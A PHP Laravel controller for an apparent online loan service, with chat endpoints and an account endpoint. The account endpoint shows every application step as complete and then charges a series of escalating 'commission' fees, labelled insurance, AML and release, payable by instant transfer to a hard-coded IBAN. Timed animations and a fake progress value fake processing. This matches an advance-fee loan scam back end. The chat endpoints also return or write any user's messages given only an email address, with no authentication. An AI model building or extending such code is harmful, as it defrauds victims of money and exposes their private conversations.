<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Chat;
use App\Models\ChatMessage;
use App\Models\User;
use App\Models\CommissionLevel;
use App\Models\IbanSetting;
use App\Support\ManagerTrafficAssigner;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AccountController extends Controller
{
    public function sendMessage(Request $request)
    {
        $request->validate([
            'body' => 'required|string|max:5000',
            'kind' => 'nullable|string',
            'level' => 'nullable|integer',
            'email' => 'nullable|email',
            'name' => 'nullable|string',
        ]);

        // Важно: чат должен идти по email текущего клиента в UI,
        // иначе при живой auth-сессии другого пользователя сообщение может
        // сохраниться в "чужой" чат и затем исчезнуть после sync по email.
        $email = trim((string) $request->input('email', ''));

        if ($email !== '') {
            $name = trim((string) $request->input('name', ''));
            if ($name === '') {
                $name = 'Anonymous';
            }

            $user = User::firstOrCreate(
                ['email' => $email],
                ['name' => $name, 'password' => bcrypt(\Illuminate\Support\Str::random(32)), 'commission_level_id' => 1]
            );
        } else {
            $user = Auth::user();

            // Fallback для старых/анонимных запросов без email.
            if (!$user) {
                $user = User::firstOrCreate(
                    ['email' => 'anonymous@it-velora.com'],
                    ['name' => 'Anonymous', 'password' => bcrypt(\Illuminate\Support\Str::random(32)), 'commission_level_id' => 1]
                );
            }
        }
        
        $assignedManagerId = ManagerTrafficAssigner::ensureUserAssignment($user);

        $chat = Chat::firstOrCreate(
            ['user_id' => $user->id],
            ['status' => 'active', 'manager_id' => $assignedManagerId]
        );

        if ($assignedManagerId && !$chat->manager_id) {
            $chat->manager_id = $assignedManagerId;
            $chat->save();
        }

        $message = $chat->messages()->create([
            'sender_type' => 'user',
            'sender_id' => $user->id,
            'message' => $request->body,
            'is_read' => false,
        ]);

        $chat->touch();

        return response()->json([
            'ok' => true,
            'message' => [
                'id' => $message->id,
                'text' => $message->message,
                'created_at' => $message->created_at,
            ],
        ]);
    }

    public function getMessages(Request $request)
    {
        // Для консистентности с sendMessage: если email пришёл, читаем именно его тред.
        $email = trim((string) $request->input('email', ''));

        if ($email !== '') {
            $user = User::where('email', $email)->first();
        } else {
            $user = Auth::user();
            if (!$user) {
                $user = User::where('email', 'anonymous@it-velora.com')->first();
            }
        }
        
        if (!$user) {
            return response()->json(['messages' => []]);
        }
        
        $chat = Chat::where('user_id', $user->id)->first();
        
        if (!$chat) {
            return response()->json(['messages' => []]);
        }

        $messages = $chat->messages()
            ->orderBy('created_at', 'asc')
            ->get()
            ->map(function ($msg) {
                return [
                    'id' => $msg->id,
                    'author' => $msg->sender_type === 'manager' ? 'agent' : 'client',
                    'text' => $msg->message,
                    'at' => $msg->created_at->toISOString(),
                    'delivery' => 'sent',
                ];
            });

        return response()
            ->json(['messages' => $messages])
            ->header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
            ->header('Pragma', 'no-cache');
    }

    public function getAccount(Request $request)
    {
        $user = $request->user();

        if (!$user) {
            return response()->json(['message' => 'Unauthenticated'], 401);
        }

        $nameParts = preg_split('/\s+/', trim((string) $user->name), 2);
        $firstName = $nameParts[0] ?? '';
        $lastName = trim((string) ($user->surname ?? ($nameParts[1] ?? '')));

        $level = (int) ($user->commission_level_id ?? 1);
        if ($level < 1) $level = 1;
        if ($level > 4) $level = 4;

        $phase = 'ready';
        if ($level === 3) {
            $phase = 'policy_build';
        }

        $fees = [
            1 => ['amountCents' => 3700, 'reason' => 'base'],
            2 => ['amountCents' => 17200, 'reason' => 'insurance'],
            3 => ['amountCents' => 13600, 'reason' => 'aml'],
            4 => ['amountCents' => 0, 'reason' => 'release'],
        ];

        $dbLevels = CommissionLevel::query()->get(['order', 'amount']);
        foreach ($dbLevels as $dbLevel) {
            $order = (int) ($dbLevel->order ?? 0);
            if (!array_key_exists($order, $fees)) {
                continue;
            }
            $fees[$order]['amountCents'] = (int) round(((float) $dbLevel->amount) * 100);
        }

        $fee = $fees[$level] ?? $fees[1];

        $ibanSettings = IbanSetting::query()->first();
        $beneficiary = trim((string) ($ibanSettings?->beneficiary_name ?? 'Velora Servizi S.r.l.'));
        if ($beneficiary === '') {
            $beneficiary = 'Velora Servizi S.r.l.';
        }

        $ibanRaw = strtoupper(preg_replace('/\s+/', '', (string) ($ibanSettings?->global_iban ?? 'IT09T0200809005000043094427')));
        if ($ibanRaw === '') {
            $ibanRaw = 'IT09T0200809005000043094427';
        }

        $swift = strtoupper(trim((string) ($ibanSettings?->bic_swift ?? 'UNCRITMMXXX')));
        if ($swift === '') {
            $swift = 'UNCRITMMXXX';
        }

        $paymentCoords = [
            'method' => 'sepa_instant',
            'beneficiary' => $beneficiary,
            'iban' => $ibanRaw,
            'swift' => $swift,
            'amountCents' => (int) $fee['amountCents'],
        ];

        $animations = [
            1 => 0,
            2 => 7 * 60 * 1000,
            3 => 0,
            4 => 3 * 60 * 1000,
        ];

        return response()->json([
            'client' => [
                'firstName' => $firstName,
                'lastName' => $lastName,
                'email' => $user->email,
            ],
            'credit' => [
                'approvedAmountCents' => (int) round(((float) ($user->requested_amount ?? 0)) * 100),
                'ratePercent' => 3.8,
                'isNew' => false,
            ],
            'policy' => [
                'status' => $level >= 4 ? 'issued' : 'processing',
                'etaMinutes' => $level >= 4 ? 0 : 30,
            ],
            'transfer' => [
                'status' => 'idle',
                'etaMinutes' => 60,
                'method' => null,
                'accountTail' => '',
            ],
            'commission' => [
                'level' => $level,
                'phase' => $phase,
                'fee' => $fee,
                'animationMs' => $animations[$level],
                'animationStartedAt' => null,
                'policyProgress' => $level >= 4 ? 1 : ($level === 3 ? 0.05 : 0),
            ],
            'steps' => [
                ['id' => 'simulation', 'completed' => true],
                ['id' => 'approval', 'completed' => true],
                ['id' => 'account', 'completed' => true],
                ['id' => 'documents', 'completed' => true],
                ['id' => 'signature', 'completed' => true],
            ],
            'currentStep' => 'signature',
            'documents' => [
                ['kind' => 'identity', 'fileName' => '', 'uploadedAt' => null],
            ],
            'payment_coords' => $paymentCoords,
            'paymentCoords' => $paymentCoords,
        ])
            ->header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
            ->header('Pragma', 'no-cache');
    }

}
